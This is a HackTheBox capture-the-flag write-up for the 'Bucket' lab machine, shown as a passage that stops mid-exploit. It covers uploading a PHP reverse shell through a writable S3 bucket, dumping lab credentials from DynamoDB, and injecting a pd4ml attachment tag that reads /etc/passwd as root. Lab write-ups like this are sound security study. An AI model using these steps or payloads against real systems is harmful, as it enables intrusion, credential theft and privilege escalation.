<!DOCTYPE html><html lang="en" > <!-- The Head v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><title>HackTheBox: Bucket write-up | GoDiego</title><meta name="generator" content="Jekyll v4.0.1" /><meta property="og:title" content="HackTheBox: Bucket write-up" /><meta name="author" content="Diego Bernal Adelantado" /><meta property="og:locale" content="en_US" /><meta name="description" content="Encrypted post!" /><meta property="og:description" content="Encrypted post!" /><link rel="canonical" href="https://diego95root.github.io/posts/Bucket/" /><meta property="og:url" content="https://diego95root.github.io/posts/Bucket/" /><meta property="og:site_name" content="GoDiego" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2020-12-09T00:00:00+01:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="HackTheBox: Bucket write-up" /><meta name="twitter:site" content="@secfaults" /><meta name="twitter:creator" content="@Diego Bernal Adelantado" /> <script type="application/ld+json"> {"description":"Encrypted post!","@type":"BlogPosting","url":"https://diego95root.github.io/posts/Bucket/","headline":"HackTheBox: Bucket write-up","dateModified":"2020-12-09T00:00:00+01:00","datePublished":"2020-12-09T00:00:00+01:00","mainEntityOfPage":{"@type":"WebPage","@id":"https://diego95root.github.io/posts/Bucket/"},"author":{"@type":"Person","name":"Diego Bernal Adelantado"},"@context":"https://schema.org"}</script> <!-- The Favicons for Web, Android, Microsoft, and iOS (iPhone and iPad) Apps Generated by: https://www.favicon-generator.org/ v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2019 Cotes Chung Published under the MIT license --><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon.png"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon-precomposed.png"><link rel="apple-touch-icon" sizes="57x57" href="/assets/img/favicons/apple-icon-57x57.png"><link rel="apple-touch-icon" sizes="60x60" href="/assets/img/favicons/apple-icon-60x60.png"><link rel="apple-touch-icon" sizes="72x72" href="/assets/img/favicons/apple-icon-72x72.png"><link rel="apple-touch-icon" sizes="76x76" href="/assets/img/favicons/apple-icon-76x76.png"><link rel="apple-touch-icon" sizes="114x114" href="/assets/img/favicons/apple-icon-114x114.png"><link rel="apple-touch-icon" sizes="120x120" href="/assets/img/favicons/apple-icon-120x120.png"><link rel="apple-touch-icon" sizes="144x144" href="/assets/img/favicons/apple-icon-144x144.png"><link rel="apple-touch-icon" sizes="152x152" href="/assets/img/favicons/apple-icon-152x152.png"><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-icon-180x180.png"><link rel="icon" type="image/png" sizes="192x192" href="/assets/img/favicons/android-icon-192x192.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="96x96" href="/assets/img/favicons/favicon-96x96.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/manifest.json"><meta name='msapplication-config' content='/assets/img/favicons/browserconfig.xml'><meta name="msapplication-TileColor" content="#ffffff"><meta name="msapplication-TileImage" content="/assets/img/favicons/ms-icon-144x144.png"><meta name="theme-color" content="#ffffff"><meta name="twitter:image" content="/assets/img/favicons/favicon.ico" /><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><meta name="google-site-verification" content="H84_zouPIHmurw2-AF7oHrWvvqJ1HhxxPpp1B6Vjpx4" /><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="cdn.jsdelivr.net"><link rel="dns-prefetch" href="cdn.jsdelivr.net"><link rel="preload" as="style" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin="anonymous"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin="anonymous"><link rel="preload" as="style" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css" integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ=" crossorigin="anonymous"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css" integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ=" crossorigin="anonymous"><link rel="preload" as="style" href="/assets/css/post.css"><link rel="stylesheet" href="/assets/css/post.css"><link rel="preload" as="style" href="/assets/lib/bootstrap-toc-1.0.1/bootstrap-toc.min.css"><link rel="stylesheet" href="/assets/lib/bootstrap-toc-1.0.1/bootstrap-toc.min.css" /><link rel="preload" as="script" href="https://cdn.jsdelivr.net/combine/npm/jquery@3.4.1,npm/popper.js@1.15.0,npm/bootstrap@4.0.0/dist/js/bootstrap.min.js" crossorigin="anonymous"> <script src="https://cdn.jsdelivr.net/combine/npm/jquery@3.4.1,npm/popper.js@1.15.0,npm/bootstrap@4.0.0/dist/js/bootstrap.min.js" crossorigin="anonymous"></script> <script src="https://polyfill.io/v3/polyfill.min.js?features=es6" crossorigin="anonymous"></script> <script src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js" async crossorigin="anonymous"></script> <script src="/assets/js/dist/commons.js" async></script> <script src="/assets/js/dist/timeago.min.js" async></script><link rel="preload" as="script" href="/assets/lib/bootstrap-toc-1.0.1/bootstrap-toc.min.js"> <script src="/assets/lib/bootstrap-toc-1.0.1/bootstrap-toc.min.js" async></script> <script src="/assets/js/dist/toc.min.js" async></script> <script src="/assets/js/dist/tooltip-loader.min.js" async></script> <script src="/app.js" defer></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column"> <!-- The Side Bar v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><div id="nav-wrapper"><div id="profile-wrapper" class="d-flex flex-column"><div id="avatar" class="d-flex justify-content-center"> <a href="/" alt="avatar"> <img src="/assets/img/favicons/logo.png" alt="avatar"> </a></div><div class="profile-text mt-3"><div id="site-title"> <a href="/">GoDiego</a></div><div id="site-subtitle" class="font-italic">Student, Bug Hunter, Security Enthusiast</div></div></div><ul class="nav flex-column"><li class="nav-item d-flex justify-content-center "> <a href="/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-home ml-3 mr-3 unloaded"></i> <span>HOME</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/tabs/categories/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-stream ml-3 mr-3 unloaded"></i> <span>CATEGORIES</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/tabs/tags/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-tags ml-3 mr-3 unloaded"></i> <span>TAGS</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/tabs/timeline/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-archive ml-3 mr-3 unloaded"></i> <span>TIMELINE</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/tabs/about/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-info ml-3 mr-3 unloaded"></i> <span>ABOUT ME</span> </a></li></ul></div><div class="sidebar-bottom d-flex flex-wrap justify-content-around mt-4"> <span id="mode-toggle-wrapper"> <!-- Switch the mode between dark and light. v2.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License --> <i class="mode-toggle fas fa-sun" dark-mode-invisible></i> <i class="mode-toggle fas fa-moon" light-mode-invisible></i> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } constructor() { if (this.mode != null) { if (this.mode == ModeToggle.DARK_MODE) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } var self = this; /* always follow the system prefers */ this.sysDarkPrefers.addListener(function() { if (self.mode != null) { if (self.mode == ModeToggle.DARK_MODE) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } }); } /* constructor() */ setDark() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_KEY); sessionStorage.removeItem(ModeToggle.MODE_KEY); } get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode == ModeToggle.DARK_MODE; } get isLightkMode() { return this.mode == ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } flipMode() { if (this.hasMode) { if (this.isSysDarkPrefer) { if (this.isLightkMode) { this.clearMode(); } else { this.setLight(); } } else { if (this.isDarkMode) { this.clearMode(); } else { this.setDark(); } } } else { if (this.isSysDarkPrefer) { this.setLight(); } else { this.setDark(); } } } /* flipMode() */ } /* ModeToggle */ let toggle = new ModeToggle(); $(".mode-toggle").click(function() { toggle.flipMode(); }); </script> </span> <span class="icon-border"></span> <a href="https://github.com/diego95root" target="_blank"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/secfaults" target="_blank"> <i class="fab fa-twitter"></i> </a> <a href="https://www.linkedin.com/in/diego-bernal-adelantado" target="_blank"> <i class="fab fa-linkedin"></i> </a> <a href="https://www.hackthebox.eu/home/users/profile/31531" target="_blank"> <i class="fas fa-cube"></i> </a> <a href=" javascript:window.open('mailto:' + ['diegobernal0905','gmail.com'].join('@'))" > <i class="fas fa-envelope"></i> </a></div></div><!-- The Top Bar v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Posts </a> </span> <span>HackTheBox: Bucket write-up</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"> <!-- Fixed kramdown code highlight rendering: https://github.com/penibelst/jekyll-compress-html/issues/101 https://github.com/penibelst/jekyll-compress-html/issues/71#issuecomment-188144901 --><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>HackTheBox: Bucket write-up</h1><div class="post-meta text-muted d-flex flex-column"><div> Posted <span class="timeago" data-toggle="tooltip" data-placement="bottom" title="Wed, Dec 9, 2020, 12:00 AM +0100"> Dec 9, 2020 <i class="unloaded">2020-12-09T00:00:00+01:00</i> </span> by <span class="author"> Diego Bernal Adelantado </span></div></div><div class="post-content"> <img src="https://www.hackthebox.eu/storage/avatars/3f07dd46f3ff7d287d2f736b18c6ded7.png"><h1 id="hack-the-box-bucket-write-up">Hack The Box: Bucket write-up</h1><p>Bucket was a medium box which, as you might deduce from the name, had some AWS S3 (and DynamoDB) stuff. It starts off with a publicly writable bucket which we can use to get a foothold into the box via uploading a simple PHP script with a reverse shell. Once in the box we see that the user has a project in development running locally as root, which we can use to read arbitrary files through the PDF generation feature.</p><p>Let’s start! The IP of the machine is <code class="highlighter-rouge">10.10.10.212</code>.</p><h2 id="enumeration">Enumeration</h2><p>I start by enumerating open ports to discover the services running in the machine. I’ll first add <code class="highlighter-rouge">bucket.htb</code> to my <code class="highlighter-rouge">/etc/hosts</code> file, then fire up nmap:</p><p><em>Result of nmap scan</em></p><div class="highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre><td class="rouge-code"><pre># Nmap 7.80 scan initiated Mon Nov 23 23:02:43 2020 as: nmap -sV -sC -oA nmap/initial bucket.htb
Nmap scan report for bucket.htb (10.10.10.212)
Host is up (0.016s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Nov 23 23:02:55 2020 -- 1 IP address (1 host up) scanned in 12.46 seconds
</pre></table></code></div></div><p>Not too much, just SSH and HTTP on the standard ports.</p><h3 id="port-80-enumeration">Port 80 enumeration</h3><p>We can see that there is some sort of advertising platform.</p><p><em>Main website</em></p><p><img src="/assets/posts_details/Bucket/images/initial1.png" alt="Img" /></p><p>By looking at the source code we can see a new virtual host for the machine: <code class="highlighter-rouge">s3.bucket.htb</code>.</p><p><em>Main website source code</em></p><p><img src="/assets/posts_details/Bucket/images/initial2.png" alt="Img" /></p><p>I added it to my hosts file and tried to use the AWS cli to test whether the bucket was properly configured, i.e if I was able to upload files.</p><p><em>Listing bucket contents and uploading a text file</em></p><p><img src="/assets/posts_details/Bucket/images/initial4.png" alt="Img" /></p><p><img src="/assets/posts_details/Bucket/images/initial5.png" alt="Img" /></p><p><img src="/assets/posts_details/Bucket/images/initial3.png" alt="Img" /></p><p>Cool, so there was a bucket called <code class="highlighter-rouge">adserver</code> and managed to upload files with <code class="highlighter-rouge">aws s3 cp poc.php s3://adserver/poc.php --endpoint-url http://s3.bucket.htb</code>. At this point I didn’t realise that I could actually exploit this further and kept searching (silly, I know).</p><h3 id="dynamodb-enumeration">DynamoDB enumeration</h3><p>I started bruteforcing and found two endpoints: <code class="highlighter-rouge">/health</code> and <code class="highlighter-rouge">/shell</code>.</p><p><em>Bruteforcing the s3 vhost</em></p><p><img src="/assets/posts_details/Bucket/images/initial6.png" alt="Img" /></p><p><img src="/assets/posts_details/Bucket/images/initial7.png" alt="Img" /></p><p><img src="/assets/posts_details/Bucket/images/initial8.png" alt="Img" /></p><p>Weird, the <code class="highlighter-rouge">/shell</code> endpoint redirects to a weird domain… I was out of ideas while trying things when I accidentally typed <code class="highlighter-rouge">/shell/</code> and was greeted with a console!</p><p><em>DynamoDB Web Shell</em></p><p><img src="/assets/posts_details/Bucket/images/console1.png" alt="Img" /></p><p>Having never used DynamoDB I started taking a look at the AWS Javascript SDK API reference and DynamoDB and came up with the following JS snippet:</p><div class="language-js highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre><span class="nx">dynamodb</span><span class="p">.</span><span class="nx">listTables</span><span class="p">({</span><span class="na">Limit</span><span class="p">:</span> <span class="mi">10</span><span class="p">},</span> <span class="kd">function</span><span class="p">(</span><span class="nx">err</span><span class="p">,</span> <span class="nx">data</span><span class="p">)</span> <span class="p">{</span>
  <span class="k">if</span> <span class="p">(</span><span class="nx">err</span><span class="p">)</span> <span class="p">{</span>
    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">Error</span><span class="dl">"</span><span class="p">,</span> <span class="nx">err</span><span class="p">.</span><span class="nx">code</span><span class="p">);</span>
  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">Table names are </span><span class="dl">"</span><span class="p">,</span> <span class="nx">data</span><span class="p">.</span><span class="nx">TableNames</span><span class="p">);</span>
  <span class="p">}</span>
<span class="p">});</span>
</pre></table></code></div></div><p><em>Getting tables</em></p><p><img src="/assets/posts_details/Bucket/images/console2.png" alt="Img" /></p><p>Then I got the table schema:</p><div class="language-js highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre><span class="nx">dynamodb</span><span class="p">.</span><span class="nx">describeTable</span><span class="p">({</span><span class="na">TableName</span><span class="p">:</span> <span class="dl">'</span><span class="s1">users</span><span class="dl">'</span><span class="p">},</span> <span class="kd">function</span><span class="p">(</span><span class="nx">err</span><span class="p">,</span> <span class="nx">data</span><span class="p">)</span> <span class="p">{</span>
  <span class="k">if</span> <span class="p">(</span><span class="nx">err</span><span class="p">)</span> <span class="p">{</span>
    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">Error</span><span class="dl">"</span><span class="p">,</span> <span class="nx">err</span><span class="p">.</span><span class="nx">code</span><span class="p">);</span>
  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">Table: </span><span class="dl">"</span><span class="p">,</span> <span class="nx">data</span><span class="p">.</span><span class="nx">Table</span><span class="p">.</span><span class="nx">KeySchema</span><span class="p">);</span>
  <span class="p">}</span>
<span class="p">});</span>
</pre></table></code></div></div><p><em>Getting users table schema</em></p><p><img src="/assets/posts_details/Bucket/images/console3.png" alt="Img" /></p><p>And finally I dumped the whole table with</p><div class="language-js highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre><span class="kd">var</span> <span class="nx">params</span> <span class="o">=</span> <span class="p">{</span>
  <span class="na">TableName</span><span class="p">:</span> <span class="dl">'</span><span class="s1">users</span><span class="dl">'</span><span class="p">,</span>
  <span class="na">Select</span><span class="p">:</span> <span class="dl">"</span><span class="s2">ALL_ATTRIBUTES</span><span class="dl">"</span><span class="p">,</span>
<span class="p">};</span>

<span class="nx">dynamodb</span><span class="p">.</span><span class="nx">scan</span><span class="p">(</span><span class="nx">params</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">err</span><span class="p">,</span> <span class="nx">data</span><span class="p">)</span> <span class="p">{</span>
<span class="k">if</span> <span class="p">(</span><span class="nx">err</span><span class="p">)</span> <span class="p">{</span>
  <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">Error</span><span class="dl">"</span><span class="p">,</span> <span class="nx">err</span><span class="p">.</span><span class="nx">code</span><span class="p">);</span>
<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
  <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">Table: </span><span class="dl">"</span><span class="p">,</span> <span class="nx">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">(</span><span class="nx">data</span><span class="p">,</span> <span class="kc">null</span><span class="p">,</span> <span class="mi">0</span><span class="p">));</span>
<span class="p">}</span>
<span class="p">});</span>
</pre></table></code></div></div><p><em>Dumping the users table</em></p><p><img src="/assets/posts_details/Bucket/images/console4.png" alt="Img" /></p><p>Juicy credentials! I tried to use them for SSH but none worked so it seemed like I was missing something…</p><div class="highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>Mgmt:Management@#1@#
Cloudadm:Welcome123!
Sysadm:n2vM-&lt;_K_Q:.Aa2
</pre></table></code></div></div><p>One thing I wondered about was whether there was any cli command to do what I just did and indeed there was:</p><div class="highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>aws dynamodb list-tables --endpoint-url http://s3.bucket.htb
aws dynamodb scan --table-name users --endpoint-url http://s3.bucket.htb
</pre></table></code></div></div><h3 id="rabbit-hole-with-ec2-metadata">Rabbit hole with EC2 metadata</h3><p>I stumbled upon <code class="highlighter-rouge">https://s3.bucket.htb/latest/meta-data/</code> and was puzzled that this returned data, since this was supposed to be an S3 bucket and not an EC2 instance. I tried to get keys but it seemed like this was a rabbit hole so after not finding anything I just moved on.</p><p><em>EC2 metadata</em></p><p><img src="/assets/posts_details/Bucket/images/ec2.png" alt="Img" /></p><h2 id="getting-user">Getting User</h2><h3 id="s3-bucket-arbitrary-file-upload">S3 bucket arbitrary file upload</h3><p>I went back to the S3 bucket stuff and retraced my steps to realise that I was stupid. The things I tried at the beginning were uploading PHP scripts and then accessing them at <code class="highlighter-rouge">https://s3.bucket.htb</code>, which obviously wasn’t working since S3 is only used for static content. What I should’ve done was accessing them through <code class="highlighter-rouge">https://bucket.htb</code>, which I knew was linked to the bucket because the pictures on the blog were the ones from the bucket.</p><p><em>Accessing uploaded file in bucket.htb</em></p><p><img src="/assets/posts_details/Bucket/images/user1.png" alt="Img" /></p><p>Cool so it works, now I just need to upload a PHP script and set up a listener with netcat.</p><p><em>Initial reverse shell</em></p><p><img src="/assets/posts_details/Bucket/images/user2.png" alt="Img" /></p><p>I had to do this a few times for it to work, as it seemed that there was something deleting everything new every some time. Once in I saw that there was a user called <code class="highlighter-rouge">roy</code> that had some kind of project.</p><p><em>Basic recon in the box</em></p><p><img src="/assets/posts_details/Bucket/images/user3.png" alt="Img" /></p><p>Interestingly enough, this project thing seemed to be coded to listen on localhost, maybe it is running?</p><p><em>Project config</em></p><p><img src="/assets/posts_details/Bucket/images/user4.png" alt="Img" /></p><p>Before doing anything else I thought of improving my shell and figured that maybe one of the passwords I found earlier could work with <code class="highlighter-rouge">roy</code>.</p><h2 id="getting-root">Getting Root</h2><h3 id="project-enumeration">Project enumeration</h3><p>The sysadmin password did the job and I was in with <code class="highlighter-rouge">roy:n2vM-&lt;_K_Q:.Aa2</code>.</p><p><em>SSH access as Roy</em></p><p><img src="/assets/posts_details/Bucket/images/user5.png" alt="Img" /></p><p>However, there wasn’t anything else interesting under <code class="highlighter-rouge">~/project</code> so I decided to further enumerate the box.</p><h3 id="bucket-app-enumeration">Bucket App enumeration</h3><p>I found a <code class="highlighter-rouge">bucket-app</code> directory on <code class="highlighter-rouge">/var/www</code> that was new to me so I took a look at it.</p><p><em>Bucket App on /var/www</em></p><p><img src="/assets/posts_details/Bucket/images/privesc1.png" alt="Img" /></p><p>It seems that this was the continuation of the previous project I saw earlier, as it has the same configuration for the DynamoDB stuff. There were extra things:</p><ul><li>The main code login takes place when we make a <code class="highlighter-rouge">POST</code> request with <code class="highlighter-rouge">action=get_alerts</code> as data.</li><li>It seems to connect to the DynamoDB on port 4566 to retrieve data.</li><li>It gets data from the <code class="highlighter-rouge">alerts</code> table, specifically the rows where <code class="highlighter-rouge">title</code> is <code class="highlighter-rouge">Ransomware</code>.</li><li>It gets that data and writes it to HTML files and then calls the jar to generate the PDF.</li></ul><p><em>index.php contents</em></p><p><img src="/assets/posts_details/Bucket/images/privesc2.png" alt="Img" /></p><p>The call to <code class="highlighter-rouge">pd4ml_demo.jar</code>, which we saw in the directory list earlier, was interesting. I googled it and saw that it was an HTML to PDF converter for Java.</p><p><em>Pd4ml website</em></p><p><img src="/assets/posts_details/Bucket/images/privesc3.png" alt="Img" /></p><p>My obvious next step was checking whether this was running on the box so I used <code class="highlighter-rouge">ss -lntu</code> to get open ports. <code class="highlighter-rouge">4566</code> was up, which meant that probably it was!</p><p><em>Ports listening on localhost</em></p><p><img src="/assets/posts_details/Bucket/images/privesc4.png" alt="Img" /></p><p><em>Project running on localhost:8000</em></p><p><img src="/assets/posts_details/Bucket/images/privesc5.png" alt="Img" /></p><p>Right, so now we know that the application is running on port 8000 and can try a <code class="highlighter-rouge">POST</code> request with <code class="highlighter-rouge">action=get_alerts</code> as data.</p><p><em>Making a POST request to the application</em></p><p><img src="/assets/posts_details/Bucket/images/privesc6.png" alt="Img" /></p><p>I got a 500, which was weird. Then I run the PDF generation command and it seemed like only root had access to that directory, which meant that the application was running as root.</p><p>Just out of curiosity I wanted to look what the app looked like, even though there was really nothing on it. I used an SSH tunnel: <code class="highlighter-rouge">ssh -L 8000:127.0.0.1:8000 roy@bucket.htb</code>.</p><p><em>SSH tunneling to access the app</em></p><p><img src="/assets/posts_details/Bucket/images/privesc7.png" alt="Img" /></p><p>Then I went back to the 500 error and tried to see where it was coming from. Given that the app was trying to get information out of the database I figured the first step should be to check what kind of data it has. To my surprise the <code class="highlighter-rouge">alerts</code> table didn’t even exist!</p><p><em>Listing the tables on the local DynamoDB instance</em></p><p><img src="/assets/posts_details/Bucket/images/privesc8.png" alt="Img" /></p><p>After reflecting on it, this made sense since it was supposed to be an app in development so maybe that part hadn’t been done yet. With all these hints I knew what the way to root was:</p><ul><li>Create the <code class="highlighter-rouge">alerts</code> table.</li><li>Add a row that contains some crafted data and make a POST request to trigger the PDF creation.</li><li>Somehow find a way to exploit the PDF generation step with that crafted data.</li></ul><h3 id="1-dynamodb-table-creation">1. DynamoDB table creation</h3><p>This first step wasn’t too complex, it was mainly googling for stuff and finding the correct arguments to pass to the command. Finally I got to:</p><div class="highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>aws dynamodb create-table --table-name alerts --atribute-definitions AttributeName=tittle,AttributeType=S --key-schema AttributeName=title,KeyType=HASH --provisioned-throughput ReadCapacityUnits=10,WriteCapacityUnits=5 --endpoint-url http://127.0.0.1:4566
</pre></table></code></div></div><p>Broken down:</p><ul><li><code class="highlighter-rouge">aws dynamodb create-table</code> is the AWS CLI syntax to create a table in DynamoDB.</li><li><code class="highlighter-rouge">--table-name alerts</code> is self-explanatory</li><li><code class="highlighter-rouge">--atribute-definitions AttributeName=tittle,AttributeType=S</code> creates a string attribute (like SQL column)</li><li><code class="highlighter-rouge">--key-schema AttributeName=title,KeyType=HASH</code> indicates that title is the primary key of the table. <code class="highlighter-rouge">KeyType</code> can be <code class="highlighter-rouge">HASH</code>, which indicates that this value is unique for every row and hence the primary key, or <code class="highlighter-rouge">RANGE</code>, which means that the primary key of the table is the combination of the hash and range keys.</li><li><code class="highlighter-rouge">--provisioned-throughput ReadCapacityUnits=10,WriteCapacityUnits=5</code> states the amount of read and write activity that the table can support.</li><li><code class="highlighter-rouge">--endpoint-url http://127.0.0.1:4566</code> is the DynamoDB URL.</li></ul><p><em>Creation of the alerts table</em></p><p><img src="/assets/posts_details/Bucket/images/privesc9.png" alt="Img" /></p><p><em>Table created</em></p><p><img src="/assets/posts_details/Bucket/images/privesc10.png" alt="Img" /></p><h3 id="2-adding-data-to-the-table">2. Adding data to the table</h3><p>Again, this was based off reading the documentation and googling. The command is simpler than the last one, the only thing to explain is that for each attribute we need to specify the type, that’s why there is an <code class="highlighter-rouge">"S"</code> key before the value.</p><div class="highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>aws dynamodb put-item --table-name alerts --item '{"title": {"S": "Ransomware"}, "data": {"S": "hello this is a test"}} --endpoint-url http://127.0.0.1:4566'
</pre></table></code></div></div><p>As that was done I tried to run the command and the PDF was generated with the content from the table.</p><p><em>Adding data to the table</em></p><p><img src="/assets/posts_details/Bucket/images/privesc11.png" alt="Img" /></p><p><em>Created PDF</em></p><p><img src="/assets/posts_details/Bucket/images/privesc12.png" alt="Img" /></p><h3 id="3-exploit-the-pdf-generation">3. Exploit the PDF generation</h3><p>Cool, so now we have the PDF generation working, we just need to find a way to exploit it. Keeping in mind that this was generated with root permissions I thought that we should be able to include local files through some <code class="highlighter-rouge">pd4ml</code> special syntax. Following <a href="https://pd4ml.com/cookbook/pdf-attachments.htm">https://pd4ml.com/cookbook/pdf-attachments.htm</a> I got <code class="highlighter-rouge">&lt;pd4ml:attachment src="file:/etc/passwd" description="attachment sample"/&gt;</code> and added it to the data attribute:</p><div class="highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>aws dynamodb put-item --table-name alerts --item '{"title": {"S": "Ransomware"}, "data": {"S": "&lt;pd4ml:attachment src=\"file:/etc/passwd\" description=\"attachment sample\"/&gt;"}}' --endpoint-url http://127.0.0.1:4566
